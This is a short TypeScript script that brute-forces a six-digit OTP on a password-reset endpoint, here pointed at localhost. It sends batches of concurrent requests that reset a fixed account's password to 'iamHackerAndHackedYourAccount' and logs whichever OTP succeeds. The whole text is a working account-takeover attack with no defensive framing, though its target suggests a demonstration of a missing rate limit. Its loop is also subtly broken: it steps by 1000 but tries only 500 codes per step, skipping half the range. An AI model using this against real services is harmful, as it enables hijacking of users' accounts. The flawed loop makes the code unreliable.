async function sendRequest(opt: string) {
  const axios = require("axios");

  let data = JSON.stringify({
    email: "helloworld@gmail.com",
    newPassword: "iamHackerAndHackedYourAccount",
    otp: opt,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/verify-otp",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  return axios.request(config);
}

async function main() {
  for (let i = 0; i < 1000000; i += 1000) {
    const requests = [];
    console.log(`Starting from ${i}`);
    for (let j = i; j < i + 500; j++) {
      requests.push(
        sendRequest(j.toString())
          .then((res) => {
            if (res.data.success) {
              console.log(`Request succeeded`);
              console.log(`OTP is : ${j}`);
            }
          })
          .catch((err) => {})
      );
    }
    await Promise.all(requests);
  }
}
main();
